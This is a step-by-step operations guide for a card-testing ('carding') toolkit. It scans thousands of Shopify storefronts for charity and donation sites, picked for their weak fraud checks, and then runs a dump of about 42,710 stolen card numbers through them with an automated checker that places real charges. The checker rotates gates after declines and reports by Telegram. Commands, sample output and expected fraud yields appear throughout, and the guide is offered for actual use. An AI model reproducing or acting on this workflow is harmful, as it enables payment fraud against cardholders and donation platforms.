# 🎯 Complete Setup Guide - Finding & Testing Donation Gates

## 📋 Two-Phase Process

### Phase 1: Find Donation Sites (Python Analyzer)
### Phase 2: Test Cards (Rust Checker with Rotational Strategy)

---

## 🔍 PHASE 1: Find Donation Sites

### What You Have

**Location:** `/home/null/Desktop/ShopifyGates/`
- 15,000 Shopify gates in text files
- Files: `15000ShopifyGatescom_00000.txt` through `15000ShopifyGatescom_XXXXX.txt`

### What the Analyzer Does

The Python analyzer (`gate_analyzer.py`) scans these 15,000 gates to find **donation/charity sites**:

1. **URL Analysis** - Looks for donation keywords in URLs
2. **Content Check** - Verifies sites are accessible
3. **Shopify Detection** - Confirms Shopify integration
4. **Payment Gateway** - Identifies payment processor
5. **Donation Form** - Finds donation pages

**Why donation sites?** They're the easiest to hit because:
- ✅ Lower fraud detection
- ✅ Accept small amounts ($1-$35)
- ✅ Less strict validation
- ✅ Designed for one-time payments

### How to Run the Analyzer

```bash
cd /home/null/Desktop/Stripeify
python3 gate_analyzer.py
```

**When prompted:**
```
How many sites to check in detail? (Enter 'all' or number, default: all):
```

**Enter:** `all` or press Enter

This will:
- Process all 15,000 Shopify gates
- Find ~500-1000 sites with donation keywords
- Verify ~50-200 are actual donation sites
- Save results to `donation_gates.json`

**Time:** ~2 hours (0.5 sec per gate × 15,000)

### Output: donation_gates.json

```json
[
  {
    "url": "https://charity1.myshopify.com",
    "gateway": "Shopify Payments",
    "donation_form": true,
    "has_shopify": true,
    "has_shopify_payments": true
  },
  {
    "url": "https://donate2.myshopify.com",
    "gateway": "Shopify + Stripe",
    "donation_form": true,
    "has_shopify": true,
    "has_shopify_payments": true
  }
]
```

**Expected:** 50-200 donation sites

---

## 💳 PHASE 2: Test Cards on Donation Sites

### What You Have

**Cards:** `/home/null/Desktop/Stripeify/42000Dump.txt`
- 42,710 cards in format: `number|month|year|cvv`

**Gates:** `donation_gates.json` (from Phase 1)
- 50-200 verified donation sites

### How to Run the Checker (Rotational Mode)

```bash
# 1. Start ChromeDriver
chromedriver --port=9515 &

# 2. Run rotational checker
cd /home/null/Desktop/Stripeify
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json \
  --telegram-config telegram_config.json
```

### What Happens

**Step 1: HTTP Pre-Screen** (~15 seconds)
```
🔍 Step 1: HTTP pre-screening gates (fast)...
→ Checking 1/156... https://charity1.myshopify.com
→ Checking 2/156... https://donate2.myshopify.com
...
✓ Found 142 accessible gates (filtered out 14 dead gates)
```

**Step 2: Find Working Gate** (~30 seconds)
```
Using first card from your list to validate gates...

🔍 Step 2: Testing gates with real card (validates payment)...
→ Testing gate 1/142... https://donate2.myshopify.com
✓ Found working gate: https://donate2.myshopify.com (Status: CVV_MISMATCH)
```

**Step 3: Test All Cards** (ongoing)
```
╔════════════════════════════════════════════════════╗
║  LIVE STATS                                        ║
╠════════════════════════════════════════════════════╣
║  Gate:   https://donate2.myshopify.com            ║
║  Card:   453201...123                              ║
║  Result: ✅ CHARGED                                ║
╠════════════════════════════════════════════════════╣
║  Progress: 1234/42710 cards (Batch 309/10678)     ║
╠════════════════════════════════════════════════════╣
║  Approved: 456    Declined: 778                    ║
║  CVV: 123    Insuf: 45    Errors: 12               ║
╠════════════════════════════════════════════════════╣
║  Success:  37.0%  Speed:  0.85 c/s  Time:  1452.3s ║
╚════════════════════════════════════════════════════╝
```

**Step 4: Auto-Rotate on Failures**
```
Testing card 5... ❌ DECLINED
Testing card 6... ❌ DECLINED
Testing card 7... ❌ DECLINED

⚠️  Gate failed 3 times consecutively - rotating...
🔍 Finding new working gate...
✓ Switched to: https://donate5.myshopify.com (Status: CHARGED)

Testing card 8... ✅ CHARGED
```

---

## 🚀 Quick Start Commands

### Option A: Use Existing donation_gates.json

If you already have `donation_gates.json`:

```bash
# Start ChromeDriver
chromedriver --port=9515 &

# Run checker
cd /home/null/Desktop/Stripeify
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json
```

### Option B: Find Donation Sites First

If you don't have `donation_gates.json`:

```bash
# Step 1: Find donation sites (Python)
cd /home/null/Desktop/Stripeify
python3 gate_analyzer.py
# Enter: all

# Step 2: Test cards (Rust)
chromedriver --port=9515 &
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json
```

### Option C: Use Rust Analyzer (Faster)

Use the Rust analyzer instead of Python:

```bash
# Step 1: Analyze with Rust (faster)
cd /home/null/Desktop/Stripeify
./target/release/shopify_checker analyze \
  --input /home/null/Desktop/ShopifyGates \
  --output donation_gates.json \
  --max 1000

# Step 2: Test cards
chromedriver --port=9515 &
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json
```

---

## 📊 File Locations

### Input Files

| File | Location | Description |
|------|----------|-------------|
| Shopify Gates | `/home/null/Desktop/ShopifyGates/` | 15,000 gates in text files |
| Cards | `/home/null/Desktop/Stripeify/42000Dump.txt` | 42,710 cards |
| Telegram Config | `/home/null/Desktop/Stripeify/telegram_config.json` | Optional |

### Output Files

| File | Location | Description |
|------|----------|-------------|
| Donation Gates | `/home/null/Desktop/Stripeify/donation_gates.json` | Found donation sites |
| Results | `/home/null/Desktop/Stripeify/results.json` | Card test results |
| Working Gates | `/home/null/Desktop/Stripeify/results_working_gates.txt` | Gates that worked |

---

## 🎯 Donation Site Detection

### Keywords the Analyzer Looks For

**Donation Keywords:**
- donate, donation, charity, foundation
- nonprofit, non-profit, fundrais, giving
- support, contribute, help, cause
- relief, aid, mission, humanitarian

**Filters Out E-commerce:**
- shop, store, buy, cart, product
- clothing, fashion, apparel, jewelry

### Why Donation Sites?

1. **Lower Fraud Detection** - Designed for one-time donations
2. **Accept Small Amounts** - $1-$35 donations common
3. **Less Strict** - Don't verify billing address as strictly
4. **Easy to Hit** - Higher success rate than e-commerce

---

## 💡 Pro Tips

### 1. Run Analyzer Overnight
```bash
# Takes ~2 hours for 15,000 gates
nohup python3 gate_analyzer.py > analyzer.log 2>&1 &
```

### 2. Test Small First
```bash
# Test with 100 cards first
head -100 42000Dump.txt > test_cards.txt
./target/release/shopify_checker rotate \
  --cards-file test_cards.txt \
  --gates donation_gates.json
```

### 3. Use Telegram Notifications
```bash
# Get updates on your phone
./target/release/shopify_checker rotate \
  --cards-file 42000Dump.txt \
  --gates donation_gates.json \
  --telegram-config telegram_config.json
```

### 4. Monitor Progress
```bash
# Watch results file grow
watch -n 5 'wc -l results.json'
```

---

## 🔧 Troubleshooting

### "No donation_gates.json found"
```bash
# Run the analyzer first
python3 gate_analyzer.py
```

### "ChromeDriver not running"
```bash
# Start ChromeDriver
chromedriver --port=9515 &

# Verify it's running
curl http://localhost:9515/status
```

### "No accessible gates found"
```bash
# Your donation_gates.json might be outdated
# Re-run the analyzer
python3 gate_analyzer.py
```

---

## 📈 Expected Results

### After Phase 1 (Analyzer)
- **Input:** 15,000 Shopify gates
- **Output:** 50-200 donation sites
- **Time:** ~2 hours
- **File:** `donation_gates.json`

### After Phase 2 (Checker)
- **Input:** 42,710 cards + donation gates
- **Output:** ~15,000-20,000 successful charges
- **Time:** ~12-15 hours
- **Success Rate:** ~35-45%
- **File:** `results.json`

---

## 🎉 You're Ready!

### Complete Workflow

```bash
# 1. Find donation sites (one-time, ~2 hours)
cd /home/null/Desktop/Stripeify
python3 gate_analyzer.py

# 2. Test cards (ongoing, ~12-15 hours)
chromedriver --port=9515 &
./target/release/shopify_checker rotate \
  --gates donation_gates.json \
  --cards-file 42000Dump.txt \
  --output results_$(date +%Y%m%d).json \
  --telegram-config telegram_config.json

# 3. Analyze results
cat results_*.json | jq '[.[] | select(.success == true)] | length'
```

**Happy checking!** 🚀
